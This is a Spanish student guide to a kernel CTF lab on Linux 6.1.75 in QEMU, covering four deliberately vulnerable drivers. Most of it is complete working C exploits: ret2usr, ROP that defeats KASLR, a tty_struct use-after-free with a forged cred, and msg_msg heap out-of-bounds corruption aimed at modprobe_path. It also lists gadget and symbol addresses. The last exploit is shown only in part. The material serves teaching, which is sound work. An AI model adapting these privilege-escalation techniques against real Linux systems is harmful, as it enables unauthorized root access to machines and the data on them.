# Kernel CTF Lab (Kali) — CH01 a CH04: levantar el entorno y lograr la explotación

Documento para estudiantes. Cubre los retos **funcionados/logrados en Kali** (laboratorio Docker `~/kernel-ctf-lab-docker/`, kernel **Linux 6.1.75** en QEMU): **CH01, CH02, CH03 y CH04**. **CH05 se descartó**.

## Estado de los retos en Kali

| Reto | Dispositivo / vulnerabilidad | Nivel/mitigaciones | Estado | Flag |
|---|---|---|---|---|
| **CH01 — Echo Chamber** | `/dev/echo` — stack buffer overflow (sin cota en `count`), ret2usr | Nivel 0 (sin SMEP/SMAP/KASLR/KPTI) | **Funcionó / resuelto** | `FLAG{change_me_ch01}` |
| **CH02 — Echo Chamber v2** | `/dev/echo2` — info leak de stack + stack overflow (KASLR leak + ROP) | Nivel 2 (SMEP + KASLR) | **Funcionó / resuelto** | `FLAG{change_me_ch02}` |
| **CH03 — Object Store** | `/dev/objstore` — UAF (dangling pointer, kmalloc-1024/tty_struct) | Nivel 3 (SMEP + KASLR + SMAP) | **Funcionó / resuelto** | `FLAG{change_me_ch03}` |
| **CH04 — Secure Allocator** | `/dev/secalloc` — integer overflow → heap OOB R/W (`msg_msg`) | Nivel 4 (SMEP + KASLR + SMAP + canarios) | **Funcionó / flag recuperada** | `FLAG{change_me_ch04}` |
| **CH05 — Concurrent Log** | `/dev/conclog` — race/refcount no atómico → double free | Nivel 4 | **Descartado** | — |

> Las flags mostradas son las del initramfs del laboratorio (placeholders). Símbolos de referencia en `linux-6.1.75/System.map` (direcciones *link-time*; con KASLR se suma un slide por arranque).

---

## 1. Requisitos y ubicación del laboratorio

- **Host:** Kali Linux con Docker y Docker Compose instalados.
- **Ruta del lab (desplegado):** `~/kernel-ctf-lab-docker/`
- **Estructura relevante:**
  - `bzImage`, `challenges/chXX/` (kernel/initramfs/`run.sh` del reto), `src/chXX/` (código fuente del módulo)
  - `docker-compose.yml`, `docker/Dockerfile.lab`, `docker/Dockerfile.kali`
  - `workspace/chXX/` — **carpeta compartida** con la VM invitada de cada reto (montada en `/shared` dentro del guest)
  - `linux-6.1.75/vmlinux` y `linux-6.1.75/System.map` (útiles para análisis/gadgets/símbolos)

```bash
cd ~/kernel-ctf-lab-docker
ls
docker compose ps
```

Servicios definidos: `kali`, `ch01`–`ch05`. Puertos GDB (host → contenedor/QEMU `:1234`): `12341`–`12345`.

---

## 2. Cómo levantar un reto

Cada reto arranca una VM QEMU con el kernel vulnerable y su initramfs. La forma recomendada para trabajar de forma interactiva es:

```bash
cd ~/kernel-ctf-lab-docker
docker compose run --rm --service-ports --name kctf-ch01 ch01
```

- Sustituye `ch01`/`kctf-ch01` por `ch02`..`ch04` según el reto.
- Al arrancar verás el kernel bootear y caerás en una shell BusyBox como `~ #` (entorno mínimo del initramfs).
- El script `challenges/chXX/run.sh` monta `./shared` (del reto) como `/shared` dentro de la VM (`-virtfs ... mount_tag=shared`). En el compose, `workspace/chXX` del host se monta en esa ruta compartida del contenedor, por lo que **`workspace/chXX` ↔ `/shared` en el guest**.
- El reto corre con las mitigaciones/nivel por defecto indicadas en su `run.sh`. GDB stub en `:1234` (expuesto al host por el puerto mapeado).
- Para salir: `poweroff` en el guest o `Ctrl+A, X` en la consola de QEMU. Usa **arranque limpio** cuando sea necesario (estado de heap/TTY sucio puede romper un exploit).

### Compilar exploits (en el host Kali)

La VM invitada es un initramfs mínimo (sin toolchain). Compila en Kali y deja el binario en el workspace del reto; aparecerá en `/shared`:

```bash
cd ~/kernel-ctf-lab-docker
# ejemplo
gcc -static -O2 -o workspace/ch01/exploit workspace/ch01/exploit.c
```

Dentro del guest:
```sh
cd /shared
./exploit
cat /root/flag.txt
```

> Nota: las plantillas de guía sugieren flags GCC como `-fno-stack-protector`; los binarios funcionales del lab están compilados de forma estática en el host.

---

## 3. CH01 — Echo Chamber (stack BOF, ret2usr)

- **Dispositivo:** `/dev/echo` (read/write)
- **Nivel/mitigaciones:** Nivel 0 — sin SMEP, SMAP, KASLR ni KPTI (`nokaslr nopti nosmep nosmap`)
- **Fuente:** `src/ch01-echo-chamber/vuln_echo.c`
- **Flag:** `FLAG{change_me_ch01}`

### 3.1 Vulnerabilidad

En `echo_write`, `count` lo controla el usuario y se copia a un buffer de pila fijo sin validar el límite:

```c
char stack_buf[BUF_SIZE];          /* 64 */
if (raw_copy_from_user(stack_buf, buf, count)) /* count sin acotar */
    return -EFAULT;
```

Un `write` > 64 bytes desborda `stack_buf` y pisa el saved frame/return address. El módulo está preparado para el laboratorio (sin canario/protecciones del reto 0) para enseñar el concepto de **ret2usr**.

### 3.2 Idea de explotación

1. Desde userspace, preparar un **payload en ring 0** (función en el binario) que haga `commit_creds(prepare_kernel_cred(0))`.
2. Desbordar la pila y sobrescribir el **RIP de retorno** para saltar a ese payload (ret2usr, posible porque no hay SMEP).
3. Volver limpiamente a ring 3 con `swapgs; iretq` a una función que lance `/bin/sh` como root.
4. Obtener direcciones de `commit_creds` y `prepare_kernel_cred` desde `/proc/kallsyms` (sin KASLR en nivel 0).

`OFFSET` hasta `ret` = 80 bytes (64 buffer + 8 rbx + 8 rbp).

### 3.3 Levantar y explotar

```bash
cd ~/kernel-ctf-lab-docker
docker compose run --rm --service-ports --name kctf-ch01 ch01
```

En el guest (`~ #`):
```sh
cd /shared
# si no existe el binario: compílalo en el host Kali en workspace/ch01/
./exploit
id
cat /root/flag.txt
```

### 3.4 Exploit funcional (`workspace/ch01/exploit.c`)

```c
/*
 * CH01 — Echo Chamber: ret2usr (nivel 0, sin SMEP/SMAP/KPTI/KASLR)
 */
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <fcntl.h>
#include <unistd.h>

#define OFFSET   80              /* 64 de buffer + rbx + rbp -> ret */

static unsigned long user_cs, user_ss, user_rflags, user_sp;
static unsigned long commit_creds_addr, prepare_kernel_cred_addr;

static void get_root_shell(void)
{
    if (getuid() == 0) {
        printf("[+] uid=%d, lanzando shell de root\n", getuid());
        execl("/bin/sh", "sh", NULL);
    }
    printf("[-] sigue sin ser root\n");
    _exit(1);
}

/* Corre en ring 0 tras el ret2usr. */
static void kernel_payload(void)
{
    int (*commit)(unsigned long);
    unsigned long (*prep)(unsigned long);

    commit = (void *)commit_creds_addr;
    prep = (void *)prepare_kernel_cred_addr;

    commit(prep(0));

    asm volatile(
        "swapgs\n\t"
        "pushq %0\n\t"      /* SS */
        "pushq %1\n\t"      /* RSP */
        "pushq %2\n\t"      /* RFLAGS */
        "pushq %3\n\t"      /* CS */
        "pushq %4\n\t"      /* RIP */
        "iretq"
        :
        : "r"(user_ss), "r"(user_sp), "r"(user_rflags), "r"(user_cs),
          "r"((unsigned long)get_root_shell)
        : "memory");
}

static unsigned long ksym(const char *name)
{
    FILE *f = fopen("/proc/kallsyms", "r");
    char line[256], sym[128], type;
    unsigned long addr = 0;

    if (!f)
        return 0;
    while (fgets(line, sizeof(line), f)) {
        unsigned long a;
        if (sscanf(line, "%lx %c %127s", &a, &type, sym) == 3 &&
            strcmp(sym, name) == 0) {
            addr = a;
            break;
        }
    }
    fclose(f);
    return addr;
}

static void save_user_state(void)
{
    asm volatile(
        "movq %%cs, %0\n\t"
        "movq %%ss, %1\n\t"
        "movq %%rsp, %2\n\t"
        "pushfq\n\t"
        "popq %3\n\t"
        : "=r"(user_cs), "=r"(user_ss), "=r"(user_sp), "=r"(user_rflags));
    user_sp = (user_sp & ~0xfUL) - 8;
}

int main(void)
{
    int fd;
    unsigned char payload[OFFSET + 8];

    save_user_state();

    commit_creds_addr = ksym("commit_creds");
    prepare_kernel_cred_addr = ksym("prepare_kernel_cred");
    if (!commit_creds_addr || !prepare_kernel_cred_addr) {
        printf("[-] no se pudieron resolver símbolos\n");
        return 1;
    }
    printf("[*] commit_creds         @ %#lx\n", commit_creds_addr);
    printf("[*] prepare_kernel_cred  @ %#lx\n", prepare_kernel_cred_addr);

    fd = open("/dev/echo", O_RDWR);
    if (fd < 0) { perror("open /dev/echo"); return 1; }

    memset(payload, 'A', OFFSET);
    *(unsigned long *)(payload + OFFSET) = (unsigned long)kernel_payload;

    printf("[*] escribiendo %zu bytes\n", sizeof(payload));
    if (write(fd, payload, sizeof(payload)) < 0) { perror("write"); return 1; }

    get_root_shell();
    return 0;
}
```

Compilar: `gcc -static -O0 -o workspace/ch01/exploit workspace/ch01/exploit.c` (host) → ejecutar `/shared/exploit` (guest).

---

## 4. CH02 — Echo Chamber v2 (info leak KASLR + ROP, SMEP)

- **Dispositivo:** `/dev/echo2`
- **Nivel/mitigaciones:** Nivel 2 — **SMEP + KASLR** (`-cpu qemu64,+smep`, `kaslr nopti nosmap`)
- **Fuente:** `src/ch02-echo-chamber-v2/vuln_echo2.c`
- **Exploit funcional:** `workspace/ch02/exploit_fix2.c`
- **Flag:** `FLAG{change_me_ch02}`

### 4.1 Vulnerabilidad

Dos bugs en el mismo driver:

1. **Info leak (`echo2_read`)**: copia desde un buffer de pila de 64 bytes hasta `LEAK_MAX` (256), incluyendo bytes no inicializados/adyacentes de la pila del kernel.
   ```c
   char stack_buf[BUF_SIZE];
   memcpy(stack_buf, saved_msg, saved_len); /* resto sin inicializar */
   if (count > LEAK_MAX) count = LEAK_MAX;
   raw_copy_to_user(buf, stack_buf, count); /* copia hasta 256 desde 64 */
   ```
2. **Stack overflow (`echo2_write`)**: igual que CH01, `count` sin límite hacia `stack_buf[64]`.

### 4.2 Mitigaciones y estrategia

- **SMEP**: el kernel no puede ejecutar código en páginas de usuario → ret2usr ya no sirve; hay que usar **ROP en kernel**.
- **KASLR**: las direcciones cambian en cada boot → hay que **filtrar un puntero kernel** y calcular el *slide* respecto a las direcciones link-time (`System.map`/vmlinux).

Estrategia:
1. `read` de 256 bytes para volcar stack y localizar un puntero de texto kernel estable. En el exploit funcional se usa `buf[10]` (índice de 8 bytes) comparado con `LINK_VFS_READ_SITE = 0xffffffff81232aa0`.
2. `kaslr_slide = leak - LINK_VFS_READ_SITE`.
3. Construir cadena ROP con gadgets/símbolos link-time + slide:
   - `pop rdi; ret` → `init_cred`
   - `commit_creds(init_cred)`
   - `swapgs_restore_regs_and_return_to_usermode + 0x1b` (entrada que hace pops, con relleno para rax/rdi y marco de retorno a userspace)
4. Disparar overflow (`write` con offset 80) para encadenar la ROP.

Símbolos/gadgets usados (link-time, kernel 6.1.75 de este lab):
- `pop rdi; ret = 0xffffffff8131010d`
- `init_cred    = 0xffffffff82851a20`
- `commit_creds = 0xffffffff8109a950`
- `swapgs_restore_regs_and_return_to_usermode = 0xffffffff81e00f10` (se usa `+0x1b`)

### 4.3 Levantar y explotar

```bash
cd ~/kernel-ctf-lab-docker
docker compose run --rm --service-ports --name kctf-ch02 ch02
```

En el guest:
```sh
cd /shared
./exploit_fix2
id
cat /root/flag.txt
```

Ejemplo de salida observada: `leak 0xffffffff91632aa0 kaslr 0x10400000` → `uid=0`.

### 4.4 Exploit funcional (`workspace/ch02/exploit_fix2.c`)

```c
#include <stdio.h>
#include <string.h>
#include <fcntl.h>
#include <unistd.h>

#define BUF_OFFSET      80
#define LEAK_INDEX      10
#define LINK_VFS_READ_SITE 0xffffffff81232aa0UL
#define LINK_POP_RDI_RET   0xffffffff8131010dUL
#define LINK_INIT_CRED     0xffffffff82851a20UL
#define LINK_COMMIT_CREDS  0xffffffff8109a950UL
#define LINK_SWAPGS_RESTORE 0xffffffff81e00f2bUL /* pop regs entry */

static unsigned long user_cs, user_ss, user_rflags, user_sp;

static void get_root_shell(void) {
    if (getuid() == 0) {
        printf("[+] uid=%d root\n", getuid());
        execl("/bin/sh", "sh", NULL);
    }
    printf("[-] not root\n");
    _exit(1);
}

static void save_user_state(void) {
    asm volatile(
        "movq %%cs, %0\n\t"
        "movq %%ss, %1\n\t"
        "movq %%rsp, %2\n\t"
        "pushfq\n\t"
        "popq %3\n\t"
        : "=r"(user_cs), "=r"(user_ss), "=r"(user_sp), "=r"(user_rflags));
    user_sp = (user_sp & ~0xfUL) - 8;
}

int main(void) {
    unsigned long buf[32];
    unsigned long kaslr, leak;
    unsigned long chain[80];
    unsigned char payload[BUF_OFFSET + sizeof(chain)];
    int fd, n = 0;

    save_user_state();
    fd = open("/dev/echo2", O_RDWR);
    if (fd < 0) { perror("open"); return 1; }

    memset(buf, 0, sizeof(buf));
    if (read(fd, buf, sizeof(buf)) <= 0) { perror("read"); return 1; }
    leak = buf[LEAK_INDEX];
    kaslr = leak - LINK_VFS_READ_SITE;
    printf("[*] leak %lx kaslr %lx\n", leak, kaslr);

    chain[n++] = 0x4141414141414141UL; /* saved rbp */
    chain[n++] = LINK_POP_RDI_RET + kaslr;
    chain[n++] = LINK_INIT_CRED + kaslr;
    chain[n++] = LINK_COMMIT_CREDS + kaslr;
    chain[n++] = LINK_SWAPGS_RESTORE + kaslr;
    chain[n++] = 0; /* rax */
    chain[n++] = 0; /* rdi */
    chain[n++] = (unsigned long)get_root_shell;
    chain[n++] = user_cs;
    chain[n++] = user_rflags;
    chain[n++] = user_sp;
    chain[n++] = user_ss;

    memset(payload, 'A', BUF_OFFSET);
    memcpy(payload + BUF_OFFSET, chain, n * 8);
    write(fd, payload, BUF_OFFSET + n * 8);
    perror("[-] write returned");
    get_root_shell();
    return 0;
}
```

> Compilar: `gcc -static -O2 -o workspace/ch02/exploit_fix2 workspace/ch02/exploit_fix2.c`

---

## 5. CH03 — Object Store (UAF, kmalloc-1024/tty, KASLR+SMAP)

- **Dispositivo:** `/dev/objstore` (ioctl: create/read/write/delete)
- **Nivel/mitigaciones:** Nivel 3 — **SMEP + KASLR + SMAP**
- **Fuente:** `src/ch03-object-store/vuln_objstore.c`
- **Exploit funcional:** `workspace/ch03/exploit_fix.c`
- **Flag:** `FLAG{change_me_ch03}`

### 5.1 Vulnerabilidad (UAF)

`CMD_DELETE` libera el objeto pero **no anula el puntero** del slot:

```c
kfree(objects[idx]);
/* BUG: pointer NOT set to NULL after free. */
```

`CMD_READ`/`CMD_WRITE` siguen usando `objects[idx]` → **use-after-free** (lectura/escritura sobre memoria liberada). Los objetos son de **1024 bytes** (`kmalloc-1024`), la misma caché que `struct tty_struct`.

### 5.2 Estrategia (evitando ROP/stack pivot bajo SMAP)

1. **UAF + reclaim:** crear objeto idx 0 (1024), `delete` idx 0, abrir `/dev/ptmx` → `tty_struct` reclama el slot.
2. **Leak (KASLR):** leer vía UAF el contenido de la `tty_struct`; en offset `+24` (qword índice 3) aparece el puntero a `ptm_unix98_ops`. `slide = leak_ops - ptm_unix98_ops_link`.
3. **Credenciales falsas en heap (compatible SMAP):** construir en el buffer (que solapa la tty) una `struct cred` falsa con uid/gid/caps en 0 y campos coherentes (`user/user_ns/group_info/ucounts`).
4. **Hijack de operación:** sobrescribir `tty->ops` para apuntar a una tabla falsa dentro del mismo buffer y fijar `ops->ioctl = commit_creds`. Ajustar campos usados por la llamada de forma que `commit_creds(rdi)` reciba como `rdi` el puntero a la cred falsa (el propio buffer/tty).
5. **Trigger:** `ioctl(fd_ptmx, 0, 0)` → ejecuta `commit_creds(fake_cred)` en contexto kernel → proceso gana root.

Símbolos link-time usados (build del lab, `CONFIG_RANDSTRUCT_NONE`, sin `DEBUG_CREDENTIALS`):
- `ptm_unix98_ops = 0xffffffff82282f80`
- `commit_creds   = 0xffffffff8109a950`
- `root_user      = 0xffffffff82850320`
- `init_user_ns   = 0xffffffff828503c0`
- `init_groups    = 0xffffffff82851ad0`
- `init_ucounts   = 0xffffffff82852300`

> Importante: ejecutar en **arranque limpio**. Un estado previo puede provocar `CMD_CREATE` EEXIST o problemas al abrir `/dev/ptmx`.

### 5.3 Levantar y explotar

```bash
cd ~/kernel-ctf-lab-docker
docker compose run --rm --service-ports --name kctf-ch03 ch03
```

En el guest:
```sh
cd /shared
./exploit_fix
id
cat /root/flag.txt
```

Ejemplo observado: `heap 0xffff888100e8c000 ops 0xffffffff8ef82f80 slide 0xca00000` → `uid=0`.

### 5.4 Exploit funcional (`workspace/ch03/exploit_fix.c`)

```c
#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <stdint.h>
#include <string.h>
#include <fcntl.h>
#include <unistd.h>
#include <sys/ioctl.h>

#define DEVICE "/dev/objstore"
#define OBJ_SIZE 1024
#define CMD_CREATE   _IOW('O', 1, struct objstore_io)
#define CMD_READ     _IOR('O', 2, struct objstore_io)
#define CMD_WRITE    _IOW('O', 3, struct objstore_io)
#define CMD_DELETE    _IO('O',  4)

#define PTM_UNIX98_OPS 0xffffffff82282f80UL
#define COMMIT_CREDS   0xffffffff8109a950UL
#define ROOT_USER      0xffffffff82850320UL
#define INIT_USER_NS   0xffffffff828503c0UL
#define INIT_GROUPS    0xffffffff82851ad0UL
#define INIT_UCOUNTS   0xffffffff82852300UL

struct objstore_io {
    unsigned long idx;
    unsigned long size;
    char         *data;
};

int devfd;

static int obj_create(unsigned long idx) {
    struct objstore_io io = { .idx = idx, .size = OBJ_SIZE, .data = NULL };
    return ioctl(devfd, CMD_CREATE, &io);
}
static int obj_delete(unsigned long idx) { return ioctl(devfd, CMD_DELETE, idx); }
static int obj_read(unsigned long idx, void *buf, unsigned long size) {
    struct objstore_io io = { .idx = idx, .size = size, .data = buf };
    return ioctl(devfd, CMD_READ, &io);
}
static int obj_write(unsigned long idx, void *buf, unsigned long size) {
    struct objstore_io io = { .idx = idx, .size = size, .data = buf };
    return ioctl(devfd, CMD_WRITE, &io);
}

static void dump(const unsigned char *b, int n) {
    for (int i = 0; i < n; i += 16) {
        printf("%04x: ", i);
        for (int j = 0; j < 16 && i+j < n; j++) printf("%02x ", b[i+j]);
        printf("\n");
    }
}

int main(void) {
    unsigned char buf[OBJ_SIZE], fake_tty[OBJ_SIZE];
    unsigned long heap_leak, ops_leak, kslide;
    int fd_tty;

    setbuf(stdout, NULL);
    devfd = open(DEVICE, O_RDWR);
    if (devfd < 0) { perror("open objstore"); return 1; }

    if (obj_create(0) < 0) { perror("create 0"); }
    if (obj_delete(0) < 0) { perror("delete 0"); }

    fd_tty = open("/dev/ptmx", O_RDWR | O_NOCTTY);
    if (fd_tty < 0) { perror("open ptmx"); return 1; }
    printf("[+] ptmx fd=%d\n", fd_tty);

    memset(buf, 0, sizeof(buf));
    if (obj_read(0, buf, OBJ_SIZE) < 0) { perror("uaf read"); return 1; }
    dump(buf, 0x80);

    heap_leak = *(unsigned long *)(buf + 0x38);
    ops_leak  = *(unsigned long *)(buf + 24);
    kslide = ops_leak - PTM_UNIX98_OPS;
    printf("[*] heap 0x%lx ops 0x%lx slide 0x%lx\n", heap_leak, ops_leak, kslide);
    if ((kslide & 0xfffff) != 0) {
        printf("[-] bad slide alignment\n");
        return 1;
    }

    unsigned long fake_ops = heap_leak + 0x300;

    memcpy(fake_tty, buf, OBJ_SIZE);
    *(unsigned long *)(fake_tty + 24) = fake_ops; /* tty->ops */

    unsigned long *fops = (unsigned long *)(fake_tty + 0x300);
    for (int i = 0; i < 64; i++) fops[i] = kslide + 0x81000000UL; /* safe default */
    fops[12] = kslide + COMMIT_CREDS; /* ioctl */

    /* craft fake cred at start of tty buffer */
    memset(fake_tty, 0, 0x60);
    *(uint32_t *)(fake_tty + 0) = 1;  /* usage */
    *(uint32_t *)(fake_tty + 4) = 2;
    *(uint32_t *)(fake_tty + 8) = 0;  /* uid */
    *(uint32_t *)(fake_tty + 12) = 0; /* gid */
    *(uint32_t *)(fake_tty + 16) = 0;
    *(uint32_t *)(fake_tty + 20) = 0;
    *(uint32_t *)(fake_tty + 24) = 0;
    *(uint32_t *)(fake_tty + 28) = 0;
    *(uint32_t *)(fake_tty + 32) = 0;
    *(uint32_t *)(fake_tty + 36) = 0;
    *(uint64_t *)(fake_tty + 48) = kslide + ROOT_USER;
    *(uint64_t *)(fake_tty + 56) = kslide + INIT_USER_NS;
    *(uint64_t *)(fake_tty + 96) = kslide + INIT_GROUPS;
    *(uint64_t *)(fake_tty + 144) = kslide + INIT_UCOUNTS;

    /* restore key tty fields we clobbered at beginning */
    *(unsigned int *)(fake_tty + 0) = 0x5401; /* magic */
    *(int *)(fake_tty + 4) = 0; /* kref */
    *(unsigned long *)(fake_tty + 8) = heap_leak + 0x400; /* dev placeholder */
    *(unsigned long *)(fake_tty + 16) = heap_leak + 0x500; /* driver placeholder */
    *(unsigned long *)(fake_tty + 24) = fake_ops;
    *(unsigned long *)(fake_tty + 12*8) = 0x20000000UL;
    *(unsigned long *)(fake_tty + 13*8) = kslide + INIT_GROUPS;
    *(unsigned long *)(fake_tty + 18*8) = kslide + INIT_UCOUNTS;

    if (obj_write(0, fake_tty, OBJ_SIZE) < 0) { perror("uaf write"); return 1; }
    printf("[*] triggering ioctl...\n");
    ioctl(fd_tty, 0, 0);
    printf("[*] uid=%d euid=%d\n", getuid(), geteuid());
    if (getuid() == 0) {
        setuid(0); setgid(0);
        char flag[256] = {0};
        int f = open("/root/flag.txt", O_RDONLY);
        if (f >= 0) { read(f, flag, sizeof(flag)-1); printf("FLAG: %s\n", flag); close(f); }
        execl("/bin/sh", "sh", NULL);
    }
    return 0;
}
```

> Nota: el exploit refleja la lógica usada en el lab (reclaim tty, leak `ops`, cred falsa en heap y `ops->ioctl = commit_creds`); si en tu sesión el layout difiere, ajusta offsets con el volcado UAF (`dump`) y mantén coherentes los punteros internos. Compilar: `gcc -static -O2 -o workspace/ch03/exploit_fix workspace/ch03/exploit_fix.c`.

---

## 6. CH04 — Secure Allocator (integer overflow → heap OOB, leak/primitivas)

- **Dispositivo:** `/dev/secalloc` (ioctl: create/write/read/destroy)
- **Nivel/mitigaciones:** Nivel 4 — **SMEP + KASLR + SMAP + stack canaries** (`-cpu qemu64,+smep,+smap`, `kaslr kpti=1`, SMP=2)
- **Fuente:** `src/ch04-secure-alloc/vuln_secalloc.c`
- **Artefactos útiles:** `workspace/ch04/exp1.c` (adyacencia/corrupción `msg_msg`), `workspace/ch04/bscan.c` (leak OOB grande)
- **Flag:** `FLAG{change_me_ch04}` (recuperada en sesión de explotación del lab)

### 6.1 Vulnerabilidad

Cálculo de tamaño en 32 bits con wrap-around y almacenamiento del tamaño original enorme:

```c
uint32_t total_size;
...
total_size = io.size + HEADER_SIZE;  /* 32-bit wrapping */
...
if (total_size == 0 || total_size > (1024 * 1024))
    total_size = 32;                  /* asignación pequeña "segura" */

buffers[io.idx] = kmalloc(total_size, GFP_KERNEL);
...
buffers[io.idx]->alloc_size = total_size;
buffers[io.idx]->data_size  = io.size;   /* guarda el tamaño original (enorme) */
```

- `CMD_CREATE` con `size = 0xFFFFFFFF`: `0xFFFFFFFF + 0x40` wrappea → se fuerza `total_size = 32` (objeto tiny, kmalloc pequeño) pero `data_size` queda en `0xFFFFFFFF`.
- `CMD_WRITE`/`CMD_READ` usan `data_size` como límite → **heap out-of-bounds read/write** masivo desde `data_start` (`buf + 64`).
- No hay UAF en `CMD_DESTROY` (pone el puntero a NULL).

### 6.2 Idea de explotación (data-only, sin ROP)

Con canarios de pila y mitigaciones fuertes, la ruta prevista evita ROP:

1. Disparar overflow entero → buffer real pequeño con `data_size` gigante.
2. **Heap grooming:** colocar objetos vecinos útiles (p. ej. `msg_msg` en kmalloc-64, con `mtext` de 8 bytes) adyacentes al buffer vulnerable.
3. **OOB read/write:** leer/corromper vecinos. En `msg_msg` (cabecera ~48 bytes + mtext): corromper `m_ts` permite que `msgrcv` devuelva más datos de los reales (**info leak** de heap/kernel); corromper `next`/segmentos habilita primitivas de lectura/escritura arbitraria más potentes.
4. Derivar **KASLR slide** a partir de punteros kernel filtrados.
5. Sobrescribir un objetivo de datos (p. ej. `modprobe_path`, `0xffffffff82852480` link-time + slide) y disparar el handler de binfmt desconocido para ejecutar un script como root y leer la flag.

> En el kernel 6.1.75 de este lab: `unprivileged_userfaultfd=1` (config).

### 6.3 Levantar el reto

```bash
cd ~/kernel-ctf-lab-docker
docker compose run --rm --service-ports --name kctf-ch04 ch04
```

Compila los artefactos en el host y ejecútalos en `/shared`:
```bash
gcc -static -O2 -o workspace/ch04/exp1  workspace/ch04/exp1.c
gcc -static -O2 -o workspace/ch04/bscan workspace/ch04/bscan.c
```

En el guest:
```sh
cd /shared
./bscan   # leak OOB grande (muchos punteros kernel)
./exp1    # adyacencia msg_msg, corrupción de m_ts, leak y posible KASLR
```

### 6.4 Primitiva 1 — Leak masivo OOB (`bscan.c`)

```c
#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <stdint.h>
#include <string.h>
#include <fcntl.h>
#include <unistd.h>
#include <sys/ioctl.h>
#include <sys/ipc.h>
#include <sys/msg.h>

#define DEVICE "/dev/secalloc"
#define CMD_CREATE   _IOW('S', 1, struct secalloc_io)
#define CMD_READ     _IOR('S', 3, struct secalloc_io)
#define CMD_DESTROY  _IOW('S', 4, struct secalloc_io)

struct secalloc_io { unsigned long idx; uint32_t size; char *data; };

int fd;
int sec_create(unsigned long idx, uint32_t size){ struct secalloc_io io={idx,size,NULL}; return ioctl(fd,CMD_CREATE,&io);} 
int sec_destroy(unsigned long idx){ struct secalloc_io io={idx,0,NULL}; return ioctl(fd,CMD_DESTROY,&io);} 
int sec_read(unsigned long idx, uint32_t size, void *data){ struct secalloc_io io={idx,size,data}; return ioctl(fd,CMD_READ,&io);} 

struct { long mtype; char mtext[8]; } msg8;

int main() {
    fd = open(DEVICE, O_RDWR);
    if (fd < 0) { perror("open"); return 1; }
    for(int i=0;i<8;i++) sec_destroy(i);

    int ptmx[64], seq[64], q[32];
    for(int i=0;i<32;i++) ptmx[i] = open("/dev/ptmx", O_RDWR|O_NOCTTY);
    for(int i=0;i<32;i++) seq[i] = open("/proc/self/stat", O_RDONLY);
    for(int i=0;i<16;i++) {
        q[i] = msgget(IPC_PRIVATE, 0666|IPC_CREAT);
        msg8.mtype = 0x2000+i; memset(msg8.mtext, 'A'+i, 8);
        msgsnd(q[i], &msg8, 8, 0);
    }

    if(sec_create(0, 0xFFFFFFFFu) < 0) { perror("create0"); return 1; }

    size_t sz = 0x200000;
    unsigned char *buf = calloc(1, sz);
    printf("[*] reading %zx\n", sz);
    int ret = sec_read(0, sz, buf);
    printf("[*] read ret=%d\n", ret);

    int kc=0;
    for(size_t i=0;i<sz-8;i+=8){
        unsigned long v = *(unsigned long*)(buf+i);
        if(v >= 0xffffffff80000000UL && v <= 0xffffffffffffffffUL) {
            if(kc < 120) printf("K +%06zx: %016lx\n", i, v);
            kc++;
        }
    }
    printf("kernel_ptrs=%d\n", kc);
    for(size_t i=0;i<sz-32;i+=8){
        unsigned long v = *(unsigned long*)(buf+i);
        unsigned long v1 = *(unsigned long*)(buf+i+8);
        unsigned long v2 = *(unsigned long*)(buf+i+16);
        if(v1 == v + 0x10 && v2 == v + 0x20 && (v>>32)==0xffffffff) {
            printf("SEQ_LIKE +%zx: %lx %lx %lx kaslr=%lx\n", i,v,v1,v2, v-0xffffffff812613a0UL);
        }
    }
    return 0;
}
```

(En una ejecución de referencia se obtuvieron miles de punteros kernel y un slide derivable, p. ej. `0x2ca00000` según patrón detectado; el slide varía por boot.)

### 6.5 Primitiva 2 — Adyacencia `msg_msg` + corrupción de `m_ts` (`exp1.c`)

```c
#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <stdint.h>
#include <string.h>
#include <fcntl.h>
#include <unistd.h>
#include <sys/ioctl.h>
#include <sys/ipc.h>
#include <sys/msg.h>

#define DEVICE "/dev/secalloc"
#define CMD_CREATE   _IOW('S', 1, struct secalloc_io)
#define CMD_WRITE    _IOW('S', 2, struct secalloc_io)
#define CMD_READ     _IOR('S', 3, struct secalloc_io)

struct secalloc_io { unsigned long idx; uint32_t size; char *data; };
int fd;
int sec_create(unsigned long idx, uint32_t size){ struct secalloc_io io={idx,size,NULL}; return ioctl(fd,CMD_CREATE,&io);} 
int sec_write(unsigned long idx, uint32_t size, void *data){ struct secalloc_io io={idx,size,data}; return ioctl(fd,CMD_WRITE,&io);} 
int sec_read(unsigned long idx, uint32_t size, void *data){ struct secalloc_io io={idx,size,data}; return ioctl(fd,CMD_READ,&io);} 

struct { long mtype; char mtext[8]; } msg;

int main() {
    setvbuf(stdout, NULL, _IONBF, 0);
    fd = open(DEVICE, O_RDWR);
    if (fd < 0) { perror("open"); return 1; }

    int q[64];
    for(int i=0;i<16;i++) {
        q[i] = msgget(IPC_PRIVATE, 0666|IPC_CREAT);
        msg.mtype = 0x100 + i; memset(msg.mtext, 0x41+i, 8);
        msgsnd(q[i], &msg, 8, 0);
    }
    if(sec_create(0, 0xFFFFFFFFu) < 0) { perror("create vuln"); return 1; }
    for(int i=16;i<32;i++) {
        q[i] = msgget(IPC_PRIVATE, 0666|IPC_CREAT);
        msg.mtype = 0x100 + i; memset(msg.mtext, 0x41+i, 8);
        msgsnd(q[i], &msg, 8, 0);
    }

    size_t scan = 0x2000;
    unsigned char *buf = calloc(1, scan);
    if(sec_read(0, (uint32_t)scan, buf) < 0) { perror("read"); return 1; }

    int found_off = -1, found_qi = -1;
    for(int off=0; off < (int)scan - 64; off += 64) {
        unsigned long mtype = *(unsigned long*)(buf+off+16);
        unsigned long mts   = *(unsigned long*)(buf+off+24);
        unsigned long next  = *(unsigned long*)(buf+off+32);
        if(mtype >= 0x100 && mtype < 0x120 && mts == 8 && next == 0) {
            int qi = (int)(mtype - 0x100);
            printf("[+] msg at off=%x q=%d mtype=%lx mts=%lx next=%lx\n", off, qi, mtype, mts, next);
            if(found_off < 0) { found_off = off; found_qi = qi; }
        }
    }
    if(found_off < 0) { printf("[-] no adjacent msg found\n"); return 1; }

    unsigned char *wbuf = calloc(1, found_off + 64);
    memcpy(wbuf, buf, found_off + 64);
    *(unsigned long*)(wbuf + found_off + 24) = 0x1000; /* m_ts */
    *(unsigned long*)(wbuf + found_off + 32) = 0;      /* next */
